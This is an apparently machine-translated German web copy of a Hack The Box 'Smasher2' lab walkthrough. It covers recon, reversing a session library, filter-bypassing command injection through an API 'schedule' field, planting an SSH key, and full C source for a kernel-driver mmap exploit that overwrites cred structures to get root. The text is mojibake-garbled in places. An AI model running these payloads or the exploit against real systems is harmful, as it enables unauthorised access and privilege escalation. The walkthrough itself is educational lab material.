<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üéÉ üéûÔ∏è üôåüèº Hack The Box - Smasher2 Komplettl√∂sung Flasche, WAF und LPE √ºber Pwn-Treiber üê≠ üö© ‚¨ÖÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel beginne ich mit der Ver√∂ffentlichung von L√∂sungen, die von der HackTheBox- Site zur weiteren Verarbeitung gesendet wurden. Ich hoffe...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Smasher2 Komplettl√∂sung Flasche, WAF und LPE √ºber Pwn-Treiber</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="Bild"></div><br>  In diesem Artikel beginne ich mit der Ver√∂ffentlichung von L√∂sungen, die von der <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox-</a> Site zur <a href="https://www.hackthebox.eu/" rel="nofollow">weiteren Verarbeitung gesendet</a> wurden.  Ich hoffe, dass dies zumindest jemandem hilft, sich auf dem Gebiet der Informationssicherheit weiterzuentwickeln.  In diesem Artikel werden wir die Bibliothek f√ºr Python umkehren, WAF umgehen und die mmap-Sicherheitsanf√§lligkeit ausnutzen. <br><br>  Die Verbindung zum Labor erfolgt √ºber VPN.  Es wird empfohlen, keine Verbindung von einem Arbeitscomputer oder einem Host herzustellen, auf dem die f√ºr Sie wichtigen Daten verf√ºgbar sind, da Sie in einem privaten Netzwerk mit Personen enden, die sich mit dem Thema Informationssicherheit auskennen :) <br><br><div class="spoiler">  <b class="spoiler_title">Organisatorische Informationen</b> <div class="spoiler_text">  Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit weiterentwickeln m√∂chten, werde ich folgende Kategorien beschreiben und besprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Crypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://t.me/RalfHackerChannel" rel="nofollow">in Telegram</a> einen <a href="https://t.me/RalfHackerChannel" rel="nofollow">Channel</a> und eine <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">Gruppe erstellt, um alle Fragen</a> im Bereich ICD <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">zu diskutieren</a> .  Auch ich werde Ihre pers√∂nlichen W√ºnsche, Fragen, Anregungen und Empfehlungen <a href="https://t.me/hackerralf8" rel="nofollow">pers√∂nlich</a> ber√ºcksichtigen <a href="https://t.me/hackerralf8" rel="nofollow">und auf alle antworten</a> . <br><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die er durch das Studium dieses Dokuments erlangt hat. <br></div></div><br><h2>  Intelligenz </h2><br><h3>  Port-Scan </h3><br>  Dieser Rechner hat eine IP-Adresse vom 10.10.10.135, die ich zu / etc / hosts hinzuf√ºge. <br> <code>10.10.10.135 smasher2.htb</code> <br>  Zuerst scannen wir offene Ports.  Da es sehr lange dauert, alle Ports mit nmap zu scannen, mache ich dies zuerst mit Masscan.  Wir scannen alle TCP- und UDP-Ports von der tun0-Schnittstelle mit einer Geschwindigkeit von 1000 Paketen pro Sekunde. <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="Bild"><br><br>  Der Host hat 3 Ports offen.  Scannen Sie es jetzt mit nmap, um weitere Details zu erhalten. <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="Bild"><br><br>  Wir haben also SSH, DNS und WEB, die den Code 403 zur√ºckgeben (Verboten, Zugriff verweigert). <br><br><h3>  DNS </h3><br>  Lassen Sie uns den DNS √ºberpr√ºfen.  Verwenden Sie dazu den Host-Client mit der Option -l, um mithilfe der AXFR-Anforderung eine Liste aller Hosts in der Dom√§ne anzuzeigen. <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="Bild"><br><br>  Daher m√ºssen Sie einen neuen Eintrag in / etc / hosts hinzuf√ºgen. <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3>  WEB </h3><br>  Nun wollen wir sehen, was uns WEB beim Zugriff auf smasher2.htb bietet. <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="Bild"><br><br>  Es ist leer  In diesem Fall sollten Sie die Verzeichnisse sortieren.  Ich benutze Golang, einen schnellen Gobuster.  Wir werden Verzeichnisse in 128 Threads sortieren, wir werden an HTML, PHP, TXT, Conf-Erweiterungen und Antwortcodes 200, 204, 301, 302, 307, 401 interessiert sein. <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="Bild"><br><br>  Suchen Sie das Sicherungsverzeichnis.  Wir schauen uns an, was drin ist. <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="Bild"><br><br>  Laden Sie daher die Python-Datei und die Bibliothek herunter.  Gehen Sie als N√§chstes zu einem anderen Domainnamen und dort finden Sie das Autorisierungsformular. <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="Bild"><br><br>  Das Mozilla Firefox Wappalyzer-Plugin meldet, welche Technologien verwendet werden.  Daher ist die Site in Python 2.7.15 geschrieben. <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="Bild"><br><br><h2>  WEB API </h2><br><h3>  Python </h3><br>  Wir haben gerade die Datei auth.py gefunden, analysieren wir sie.  In der ersten Zeile des Imports wenden wir uns dem Modul ses.so zu, das wir auch in Backups gefunden haben. <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="Bild"><br><br>  Wir finden die Authentifizierung im Code.  Bei erfolgreicher Authentifizierung erhalten wir secret_token_info zur√ºck. <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="Bild"><br><br>  Gehen wir zum Punkt "/ api // job".  Die Daten werden von der POST-Methode empfangen, w√§hrend sie im JSON-Format vorliegen m√ºssen.  Wenn der Zeitplanparameter in den Daten vorhanden ist, wird er als Befehl in der Befehlszeile an die Ausf√ºhrung √ºbergeben. <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="Bild"><br><br>  Login und Passwort wurden bearbeitet ... Sie werden in unsere Bibliothek √ºbertragen, die eine Sitzung erstellt - das SessionManager-Objekt. <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="Bild"><br><br>  Die safe_init_manager (id) -Funktion wird bei jedem neuen Aufruf aufgrund von before_request aufgerufen.  Somit wird eine neue Sitzung initialisiert. <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="Bild"><br><br>  Die login () -Funktion erstellt ein sitzungsabh√§ngiges Managerobjekt. <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="Bild"><br><br>  Und die Pr√ºfung wird von der check_login () -Methode durchgef√ºhrt. <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="Bild"><br><br><h3>  Umgekehrt .so </h3><br>  Wir m√ºssen also herausfinden, wie die Daten √ºberpr√ºft werden.  Dazu m√ºssen wir in der Bibliothek das Ger√§t SessionManager.check_login () verstehen.  In IDA Pro nach der gew√ºnschten Funktion suchen. <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="Bild"><br><br>  Als ich die Funktion √∂ffnete, machte ich auf ihre Grafik aufmerksam.  Ich war an einer Reihe von unteren Bl√∂cken interessiert, bevor ich zusammenkam. <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="Bild"><br><br>  Wenn Sie durch die Bl√∂cke schauen, k√∂nnen Sie sehen, wovon dieser oder jener Zweig der Funktionsausf√ºhrung spricht.  Wir brauchen also nur den am weitesten rechts stehenden Block. <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="Bild"><br><br>  Ich habe die Verhaltenslinie der Funktion gezeichnet, die uns interessiert. <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="Bild"><br><br>  Nun schauen wir mal, was passiert.  An einer Stelle bemerkte ich einen identischen Code f√ºr Login und Passwort.  Und auch der gleiche Vergleich. <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="Bild"><br><br>  Dieselbe Funktion wird auch f√ºr Login und Passwort aufgerufen. <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="Bild"><br><br>  Dies deutet darauf hin, dass Benutzername und Passwort identisch sind.  Da dieser Wert jedoch in das Python-Programm eingeht und bearbeitet wurde, muss er nur noch sortiert werden.  Ich habe versucht, den Standardnamen zu verwenden, und zu meiner √úberraschung kam der Administrator (warum habe ich es nicht sofort versucht ...). <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="Bild"><br><br><h2>  Einstiegspunkt </h2><br>  Wir haben einen Schl√ºssel.  Jetzt m√ºssen Sie die Anforderung sammeln, um den Code auszuf√ºhren.  Wie bereits erw√§hnt, m√ºssen die Daten der POST-Methode, die den Zeitplanparameter im JSON-Format enthalten, an <a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job gesendet werden</a> .  Wir machen das mit curl und √ºbergeben das Ergebnis an jq.  Wir werden den whoami Befehl ausf√ºhren. <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="Bild"><br><br>  Beim Versuch, den Befehl "ls" auszuf√ºhren, wird jedoch eine Fehlermeldung ausgegeben. <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="Bild"><br><br>  H√∂chstwahrscheinlich gibt es einen Filter im Team.  Senden wir "l \\ s" - erfolgreich, was auf das Vorhandensein eines Filters hinweist. <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="Bild"><br><br><h2>  USER </h2><br>  Jetzt m√ºssen wir eine normale Shell in das System bekommen.  Das System f√ºhrt SSH aus, sodass wir einen Schl√ºssel generieren und in die Liste der autorisierten Hosts verschieben k√∂nnen. <br><br>  Zuerst generieren wir einen Schl√ºssel. <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="Bild"><br><br>  Jetzt m√ºssen wir unseren √∂ffentlichen Schl√ºssel in die Datei /home/dzonerzy/.ssh/authorized_keys √ºbertragen.  Um die √úbertragung zu vereinfachen, verwenden wir die Codierung in base64. <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br>  Wir √ºbertragen es zuerst in eine tempor√§re Datei. <br><br><pre> <code class="bash hljs">ec\\ho \‚Äù=\‚Äù &gt; /tmp/ralf</code> </pre> <br>  Jetzt dekodieren und wie vorgesehen schreiben. <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br>  Wir haben den Schl√ºssel aufgeschrieben. Wenn alles in Ordnung ist, k√∂nnen wir uns √ºber SSH mit dem privaten Schl√ºssel verbinden.  Wir versuchen es.  Und wir sind im System. <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="Bild"><br><br><h2>  LPE - ROOT </h2><br><h3>  Auflistung </h3><br>  Neben dem Token des Benutzers befindet sich die README-Datei.  Lies es. <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="Bild"><br><br>  Uns wird gesagt, dass wir nicht normal denken sollten ... Aber nachdem ich die Standardaufz√§hlungen abgeschlossen und nichts gefunden hatte, machte ich auf die Gruppe aufmerksam, in der sich der Benutzer befindet. <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="Bild"><br><br>  Die ADM-Gruppe hat Zugriff auf interessante Dateien. <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="Bild"><br><br>  Zum Beispiel auth.log.  Es spiegelt nicht nur die Tatsachen einer erfolgreichen und nicht erfolgreichen Autorisierung wider, sondern auch die Tatsachen der Verwendung des Befehls sudo. <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="Bild"><br><br>  Ein interessanter Befehl wird im Auftrag des root ausgef√ºhrt.  Da dies jedoch mit dem Treiber zusammenh√§ngt, m√ºssen Sie sicherstellen, dass wir dem Pfad folgen. <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="Bild"><br><br>  Ja, leider geht alles an den Fahrer. <br><br><h3>  Fahrer </h3><br>  Da es sich um einen Treiber (Kernelmodul) handelt, erhalten wir Informationen dazu mit modinfo. <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="Bild"><br><br>  Es wird gesagt, dass der Treiber ben√∂tigt wird, um mit dem dhid-Ger√§t zu arbeiten.  Probieren Sie es aus. <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="Bild"><br><br>  Ja  Es gibt so ein Ger√§t.  Um den Treiber zu studieren, habe ich ihn selbst kopiert und in IDA Pro heruntergeladen. <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br>  Eine sp√§rliche Liste von Funktionen, von denen wir uns f√ºr PWN f√ºr diejenigen interessieren, die mit Speicher arbeiten.  Gemessen an den Namen sind dies dev_read und dev_mmap. <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="Bild"><br><br>  Beim weiteren googeln habe ich keine Informationen √ºber die Sicherheitsl√ºcke in Treibern im Zusammenhang mit Lesen gefunden, die nicht √ºber mmap gesagt werden k√∂nnen!  Also ging ich zu ihr. <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="Bild"><br><br>  Im Allgemeinen ist eine MMAP in den Treibern erforderlich, um das Ger√§t dem Speicher zuzuordnen und Seiten nach Bedarf auszuw√§hlen, da das Ger√§t anfangs √ºberhaupt keinen physischen Speicher verwendet. <br><br>  In diesem Code ist nur der Aufruf der Funktion remap_pfn_range interessant, mit der der Speicher des Ger√§ts dem Adressraum des Benutzers linear zugeordnet werden kann. <br><blockquote>  int remap_pfn_range (struct vm_area_struct * vma, vorzeichenlose long virt_add, vorzeichenlose long pfn, vorzeichenlose long size, pgprot_t prot); <br><br>  Zeigt die Gr√∂√üenbytes der physischen Adressen an, beginnend mit der Seitenzahl, die von pfn f√ºr die virtuelle Adresse virt_add angegeben wurde.  Die dem virtuellen Raum zugeordneten Sicherheitsbits werden in prot angegeben. </blockquote><br>  Wie √ºblich betrachten wir Parameter, die zuvor nicht verarbeitet wurden.  Dies sind die Parameter pfn und size, mit denen sich beliebig viel Speicher zum Lesen und Schreiben anzeigen l√§sst. <br><br><h3>  Ausnutzen </h3><br>  Als ich googelte, was dagegen getan werden kann, war ich von einer m√∂glichen Art der Ausbeutung beeindruckt.  Wenn wir die creds-Kontrollstruktur im Speicher finden, k√∂nnen wir die Benutzer-UID auf 0 √§ndern und dann die Shell aufrufen, die uns eine Shell mit vollen Rechten gibt. <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="Bild"><br><br>  √úberpr√ºfen Sie zun√§chst, ob wir eine gro√üe Menge an Speicher anzeigen k√∂nnen.  Der folgende Code √∂ffnet das Ger√§t und zeigt 0xf0000000 Bytes ab der Adresse 0x40404040 zum Lesen und Schreiben mit der M√∂glichkeit an, diese Reflexion mit anderen Prozessen zu verwenden, die dasselbe Objekt widerspiegeln. <br><br><div class="spoiler">  <b class="spoiler_title">Code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Kompiliere: <code>gcc sh.c -o sh.bin</code> und √ºbertrage auf den Host.  Lass es uns machen. <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="Bild"><br><br>  Gehen wir nun zu einem anderen ssh-Terminal und sehen uns die Speicherkarte dieses Prozesses an. <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="Bild"><br><br>  Wie Sie sehen, ist die Adresse dieselbe, Beschriftungen zum Lesen und Schreiben sowie zum Teilen sind angebracht.  Das ist eine funktionierende Idee.  Der n√§chste Schritt besteht darin, die Creds-Struktur des Prozesses im Auge zu behalten.  Aus der obigen Struktur ist ersichtlich, dass das Markenzeichen aus 8 Zahlen besteht, die von unserer UID in einer Reihe verwundet wurden. <br><br><div class="spoiler">  <b class="spoiler_title">Code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  So fanden wir 19 √§hnliche Strukturen. <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="Bild"><br><br>  Jetzt m√ºssen wir alle UIDs auf 0 setzen. Nachdem wir die UIDs einer bestimmten Struktur neu geschrieben haben, werden wir unsere UID √ºberpr√ºfen.  Sobald unsere UID gleich 0 wird, k√∂nnen wir davon ausgehen, dass wir die Struktur des Prozesses gefunden haben, den wir ben√∂tigen. <br><br><div class="spoiler">  <b class="spoiler_title">Code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="Bild"><br><br>  Nachdem wir die ben√∂tigte Struktur gefunden haben, √§ndern wir die UID in 0xffffffff und rufen die Bash-Shell √ºber die exec-Funktion auf. <br><br><div class="spoiler">  <b class="spoiler_title">Code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="Bild"><br><br>  Wir haben Wurzel.  